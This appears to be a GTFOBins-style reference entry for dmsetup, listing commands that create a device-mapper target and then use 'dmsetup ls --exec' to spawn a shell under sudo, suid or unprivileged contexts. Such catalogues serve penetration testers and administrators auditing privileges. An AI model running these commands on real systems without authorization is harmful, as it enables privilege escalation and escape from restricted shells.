title: dmsetup
html:
dmsetup

Shell

Context: sudo, suid, unprivileged

dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
excerpt: dmsetup Shell Context: sudo, suid, unprivileged dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF dmsetup ls --exec '/bin/sh -s'
